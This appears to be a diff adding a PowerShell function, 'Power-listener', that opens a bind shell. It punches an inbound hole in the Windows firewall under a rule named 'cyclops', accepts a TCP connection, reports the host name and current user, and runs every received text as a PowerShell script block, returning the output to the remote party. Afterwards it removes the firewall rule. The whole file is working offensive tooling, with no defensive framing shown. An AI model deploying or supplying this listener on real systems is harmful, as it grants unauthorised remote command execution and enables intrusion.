@@ -1,0 +1,81 @@
+function Power-listener
+{
+    [CmdletBinding()]
+    Param (
+        [Parameter()]
+        [Alias('p')]
+        [int]$port
+    )
+
+    netsh advfirewall firewall delete rule name="cyclops $port" | Out-Null
+    netsh advfirewall firewall add rule name="cyclops $port" dir=in action=allow protocol=TCP localport=$port | Out-Null
+
+    $Tcplistener = New-object System.Net.Sockets.TcpListener $port
+    $Tcplistener.Start()
+    Write-host "[**] Listening on 0.0.0.0:$port [TCP]"
+    $TcpClient = $Tcplistener.AcceptTcpClient()
+    $remoteclient = $TcpClient.Client.RemoteEndPoint.Address.IPAddressToString
+    Write-Verbose "[**] New connection coming from: $remoteclient"
+
+$TcpNetworkstream = $TCPClient.GetStream()
+    $Receivebuffer = New-Object Byte[] $TcpClient.ReceiveBufferSize
+    $encodingtype = new-object System.Text.ASCIIEncoding
+
+    $bytestosend = $encodingtype.GetBytes("`nYou have accessed ["+(hostname)+"] as: "+(whoami)+"`n")
+    $bytestosend += $encodingtype.GetBytes(("`n["+(hostname)+"] PS " + (Get-Location).Path) +'> ')
+    $TcpNetworkstream.Write($bytestosend, 0, $bytestosend.Length)
+
+    try {
+        while ($TCPClient.Connected){
+            $Read = $TcpNetworkstream.Read($Receivebuffer, 0, $Receivebuffer.Length)
+            if( $Read -eq 0){break}
+            else{
+                [Array]$Bytesreceived += $Receivebuffer[0..($Read -1)]
+                [Array]::Clear($Receivebuffer, 0, $Read)
+            }
+
+            if ($TcpNetworkstream.DataAvailable) {continue}
+            else{
+                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($Bytesreceived))
+                if ($ScriptBlock -match "break") {
+                    $sendback = $encodingtype.GetBytes(("`n[!!!] Closing Connection with ["+(hostname)+"]. Press ENTER to continue.."))
+                    $TcpNetworkstream.Write($sendback, 0, $sendback.Length)
+                    $TcpNetworkstream.Flush()
+                    break
+                }
+                $Global:Error.Clear()
+
+                try{
+                    $results = $ScriptBlock.Invoke() | Out-String
+                    $sendback = $encodingtype.GetBytes($results)
+                }
+                catch{
+                    write-verbose "[!!!] NOT VALID COMMAND"
+                    foreach ($Err in $Global:Error) {
+                        $sendback = $encodingType.GetBytes($Err.Exception.Message)
+                    }
+                }
+                write-verbose "Results: $results"
+
+                $sendback += $encodingtype.GetBytes(("`n["+(hostname)+"] PS " + (Get-Location).Path) +'> ')
+                $TcpNetworkstream.Write($sendback, 0, $sendback.Length)
+                $TcpNetworkstream.Flush()
+                $results = $null
+                $Bytesreceived = $null
+            }
+        }
+    }
+    catch {"`n[!!!] TCP connection is broken, exiting.."}
+    try{
+        if ($PSVersionTable.CLRVersion.Major -lt 4) {$Tcpclient.Close(); $TcpNetworkstream.Close(); $Tcplistener.Stop()}
+        else {$TcpNetworkstream.Dispose(); $Tcpclient.Dispose(), $Tcplistener.Stop()}
+
+        Write-Verbose "[**] TCPClient Connected : $($TcpClient.Connected)"
+        Write-Verbose "[**] TCPListener was stopped gracefully"
+        Write-Verbose "[**] TCPNetworkStream was closed/disposed gracefully`n"
+
+        netsh advfirewall firewall delete rule name="cyclops $port" | Out-Null
+        Write-Verbose "[**] FW Rule has been deleted.."
+    }
+    catch { Write-Warning "Failed to close TCP Stream"}
+}
